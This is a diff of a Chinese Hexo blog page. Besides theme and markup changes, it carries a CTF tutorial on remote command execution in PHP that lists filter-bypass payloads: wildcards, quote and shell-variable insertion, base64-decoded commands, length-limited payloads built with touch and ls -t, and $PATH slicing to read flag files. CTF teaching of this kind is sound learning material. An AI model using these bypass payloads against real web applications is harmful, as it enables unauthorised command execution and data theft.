@@ -18,26 +18,22 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="rce：远程代码执行 成因：在 Web 应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞； # 系统命令执行函数 system ()：能将字符串作为 OS 命令执行，且返回命令执行结果； exec ()：能将字符串作为 OS 命令执行，但是只返回执行结果的最后一行 (约等于无回显)； shell_e">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF中的RCE">
 <meta property="og:url" content="http://example.com/2024/10/31/CTF%E4%B8%AD%E7%9A%84RCE/index.html">
 <meta property="og:site_name" content="Bae">
-<meta property="og:description" content="rce：远程代码执行 成因：在 Web 应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞； # 系统命令执行函数 system ()：能将字符串作为 OS 命令执行，且返回命令执行结果； exec ()：能将字符串作为 OS 命令执行，但是只返回执行结果的最后一行 (约等于无回显)； shell_e">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205501710.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205501710.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205632574.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205723564.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205816840.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031210010380.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031210829705.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031220300782.png">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-10-31T12:21:15.000Z">
-<meta property="article:modified_time" content="2024-10-31T14:04:22.887Z">
+<meta property="article:modified_time" content="2025-03-03T13:58:28.851Z">
 <meta property="article:author" content="Bae">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031205501710.png">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
     
     <!--- Icon Part-->
@@ -66,7 +62,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -86,7 +82,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
     window.data = {"masonry":false};
   </script>
@@ -111,29 +107,26 @@
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
+	<div class="progress-bar-container">
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
-
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container flex flex-col justify-between min-h-dvh">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
     <div class="navbar-content transition-navbar ">
         <div class="left">
             
@@ -218,7 +211,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -229,40 +222,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CTF中的RCE</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CTF中的RCE</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/redefine-avatar.svg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-10-31 20:21:15</span>
@@ -272,8 +262,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-31 22:04:22</span>
-            <span class="mobile">2024-10-31 22:04:22</span>
+            <span class="desktop">2025-03-03 21:58:28</span>
+            <span class="mobile">2025-03-03 21:58:28</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -291,16 +281,16 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>rce：远程代码执行</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>rce：远程代码执行</p>
 <p>成因：在 Web 应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞；</p>
 <h4 id="系统命令执行函数"><a class="markdownIt-Anchor" href="#系统命令执行函数">#</a> 系统命令执行函数</h4>
 <p>system ()：能将字符串作为 OS 命令执行，且返回命令执行结果；</p>
@@ -328,7 +318,7 @@ Java：Java 里面没有类似于 php 中的 eval 函数可以直接将字符串
 <p><em>意思就是可以是任何字符         cat /flag.php   -----&gt;cat /f</em></p>
 <p>这里就会找到 f 打头，后面随意的文件名</p>
 <h4 id="即正则匹配绕过"><a class="markdownIt-Anchor" href="#即正则匹配绕过">#</a> 即正则匹配绕过</h4>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//如flag被过滤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//如flag被过滤</span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;3&#125;</span><br></pre></td></tr></table></figure></div>
 <h2 id="image-20241031205501710"><a class="markdownIt-Anchor" href="#image-20241031205501710">#</a> <img  
                      lazyload
                      src="/images/loading.svg"
@@ -377,7 +367,7 @@ cat flag  —&gt;   ca’t flag</p>
 <h2 id="特殊变量绕过"><a class="markdownIt-Anchor" href="#特殊变量绕过">#</a> 特殊变量绕过</h2>
 <p>我们可以使用 Linux 中的一些特殊变量进行绕过</p>
 <p>$* $@ $x ${X} // 这里的 x 代表任意值</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t  flag.php</span><br><span class="line">ca$@t flag.php</span><br><span class="line">ca$xt flag.php</span><br><span class="line">ca$&#123;X&#125;t flag.php</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t  flag.php</span><br><span class="line">ca$@t flag.php</span><br><span class="line">ca$xt flag.php</span><br><span class="line">ca$&#123;X&#125;t flag.php</span><br></pre></td></tr></table></figure></div>
 <p>这些都是 shell 的特殊变量，也是可以用来绕过的，这种类型可以用在过滤了 cat 这种命令或者其他关键字符串上面使用。</p>
 <p><img  
                      lazyload
@@ -385,12 +375,18 @@ cat flag  —&gt;   ca’t flag</p>
                      data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20241031210829705.png"
                       alt="image-20241031210829705"
                 ></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt;  ls</span><br><span class="line">-&gt; flag</span><br><span class="line">shell --&gt;  cat ?la*</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt;  ls</span><br><span class="line">-&gt; flag</span><br><span class="line">shell --&gt;  cat ?la*</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
 <p>下面是对这个骚操作的解释</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt; cat ?la*</span><br><span class="line">这个命令的目的是读取文件内容，其中使用了 cat 和通配符：</span><br><span class="line"></span><br><span class="line">cat 是 Linux 中用于显示文件内容的命令。</span><br><span class="line"></span><br><span class="line">?la* 是一个通配符，用来匹配文件名的模式。具体解释如下：</span><br><span class="line"></span><br><span class="line">?：表示任意单个字符，所以这里的 ? 表示任何一个字符。</span><br><span class="line">la：表示文件名中紧跟在通配符后的具体字符组合，即匹配名称中包含 la 的文件。</span><br><span class="line">*：表示任意数量的字符（包括空字符），意味着文件名可以以 la 开头，后面可以跟任何字符。</span><br><span class="line">因此，?la* 可以匹配一个以任意单字符开头，紧跟着 la，后面可以是任意字符的文件名。在当前环境中，它成功匹配到了文件 flag，因为 flag 满足 ?la* 的模式（即文件名前有一个字符 f，紧跟 la，且文件名之后无字符）。</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell --&gt; cat ?la*</span><br><span class="line">这个命令的目的是读取文件内容，其中使用了 cat 和通配符：</span><br><span class="line"></span><br><span class="line">cat 是 Linux 中用于显示文件内容的命令。</span><br><span class="line"></span><br><span class="line">?la* 是一个通配符，用来匹配文件名的模式。具体解释如下：</span><br><span class="line"></span><br><span class="line">?：表示任意单个字符，所以这里的 ? 表示任何一个字符。</span><br><span class="line">la：表示文件名中紧跟在通配符后的具体字符组合，即匹配名称中包含 la 的文件。</span><br><span class="line">*：表示任意数量的字符（包括空字符），意味着文件名可以以 la 开头，后面可以跟任何字符。</span><br><span class="line">因此，?la* 可以匹配一个以任意单字符开头，紧跟着 la，后面可以是任意字符的文件名。在当前环境中，它成功匹配到了文件 flag，因为 flag 满足 ?la* 的模式（即文件名前有一个字符 f，紧跟 la，且文件名之后无字符）。</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20250228182734429.png"
+                      alt="image-20250228182734429"
+                ></p>
 <h2 id="base64编码绕过"><a class="markdownIt-Anchor" href="#base64编码绕过">#</a> Base64 编码绕过</h2>
 <p>这个可以用在一些命令被过滤的情况下使用，比如说我们的 ls 命令被过滤了，那我们可以将 ls 这个命令编码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;ls&#x27; | base64</span><br><span class="line">-&gt;bHMK</span><br><span class="line">`echo &#x27;bHMK&#x27; | base64 -d</span><br><span class="line">-&gt; flag.ph  test.php  ......</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;ls&#x27; | base64</span><br><span class="line">-&gt;bHMK</span><br><span class="line">`echo &#x27;bHMK&#x27; | base64 -d</span><br><span class="line">-&gt; flag.ph  test.php  ......</span><br></pre></td></tr></table></figure></div>
 <p>就是先把 ls 的内容 base64 加密后再解密输出出来，就是绕了一下加解密的过程来绕过</p>
 <h2 id="拼接法"><a class="markdownIt-Anchor" href="#拼接法">#</a> 拼接法</h2>
 <p>这个的大概思路为，用两个参数来保存 flag 这个字符串的每个部分。大致如下</p>
@@ -417,22 +413,22 @@ cat flag  —&gt;   ca’t flag</p>
 <p>highlight_file()</p>
 <h4 id="读取文件"><a class="markdownIt-Anchor" href="#读取文件">#</a> 读取文件</h4>
 <p>这里我们这样玩，我们除了 cat 可以显示文本内容以外，在 CTF 中我们还可以使用一下几个姿势</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br><span class="line">tac flag</span><br><span class="line">//如果说我们遇到ls被过滤的话，我们也可以使用find</span><br><span class="line">find</span><br><span class="line">-?&gt;  .   ./flag</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br><span class="line">tac flag</span><br><span class="line">//如果说我们遇到ls被过滤的话，我们也可以使用find</span><br><span class="line">find</span><br><span class="line">-?&gt;  .   ./flag</span><br></pre></td></tr></table></figure></div>
 <h3 id="字符串长度限制ノωノ"><a class="markdownIt-Anchor" href="#字符串长度限制ノωノ">#</a> 字符串长度限制 (ﾉ*･ω･)ﾉ</h3>
 <p>这个挺有意思的，在 CTF 中，题目可能会限制你输入的长度，如果说我们要绕过他的话，我们可以只用上文中的一些思想，我们直接看 payload</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">-&gt; flag&#123;ABsec&#125;</span><br><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line">ls -t &gt; shell</span><br><span class="line">sh shell</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">-&gt; flag&#123;ABsec&#125;</span><br><span class="line">touch &quot;ag&quot;</span><br><span class="line">touch &quot;fl\\&quot;</span><br><span class="line">touch &quot;t \\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">-&gt;ca\ ,  t \  ,  fl\  ,  ag  ,  shell ,  flag</span><br><span class="line">ls -t &gt; shell</span><br><span class="line">sh shell</span><br><span class="line">-&gt;flag&#123;ABsec&#125;</span><br></pre></td></tr></table></figure></div>
 <p>首先是里面的一些命令</p>
 <p>空格 \ ： 这个其实是换行。<br>
 ls -t ：按照时间将文本排序输出<br>
  ls -t &gt; shell：将 ls -t 的输出储存到 shell 文件中<br>
 我们首先是用 touch 命令创建了几个文件，但是他们的文件名是我们的主要。我们使用两个 \ 的原因在于，第一个 \ 用于将后面的 \ 变成字符串，第二个 \ 是用来将后面的文本转换为字符串，以便用于后面的测试。</p>
 <p>这样我们 shell 里面的样子应该是这样的：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat shell</span><br><span class="line">-&gt;cat</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat shell</span><br><span class="line">-&gt;cat</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></div>
 <p>因为 \ 就是用来换行的，不然他们连在一起也无法被解析。</p>
 <h3 id="path-ノωノ"><a class="markdownIt-Anchor" href="#path-ノωノ">#</a> $PATH (ﾉ*･ω･)ﾉ</h3>
 <p>这个是利用环境变量来达到截取字母绕过的目的。</p>
 <p>这里我们可以举一个例子：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">/opt/jdk-21/bin         //假如是这样的</span><br><span class="line">echo $&#123;PATH:2:1&#125;</span><br><span class="line">-&gt;p</span><br><span class="line">echo $&#123;PATH:3:1&#125;</span><br><span class="line">-&gt;t</span><br><span class="line">echo $&#123;PATH:3:2&#125;</span><br><span class="line">-&gt;t/</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">/opt/jdk-21/bin         //假如是这样的</span><br><span class="line">echo $&#123;PATH:2:1&#125;</span><br><span class="line">-&gt;p</span><br><span class="line">echo $&#123;PATH:3:1&#125;</span><br><span class="line">-&gt;t</span><br><span class="line">echo $&#123;PATH:3:2&#125;</span><br><span class="line">-&gt;t/</span><br></pre></td></tr></table></figure></div>
 <p>Linux 中 ${PATH🅰️b} 我们可以理解为从 a 位开始截取，截取 b 个长度（/ 也算一位）</p>
 <p>那我们对应这来的话就是这样的</p>
 <p>/ o p t / j d k - 2 1 / b i n</p>
@@ -441,19 +437,19 @@ ls -t ：按照时间将文本排序输出<br>
 <p>那就表示，我们从 t 开始，往后截取两位数</p>
 <p>输出: t/</p>
 <p>但是这样可能也会出现一些没有的字母，但是我们需要那个字母的情况，这个时候我们可以自己取构造一个 PATH。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/abcdefghijklmn/opq/rst/uvw/xyz/0123456789</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/abcdefghijklmn/opq/rst/uvw/xyz/0123456789</span><br></pre></td></tr></table></figure></div>
 <p>我们直接将全部的字母和数字都放到环境变量中，需要的时候我们就用上面的那个方法进行构造 payload。、</p>
 <p>有的题会没有回显</p>
 <h4 id="取反绕过"><a class="markdownIt-Anchor" href="#取反绕过">#</a> 取反绕过</h4>
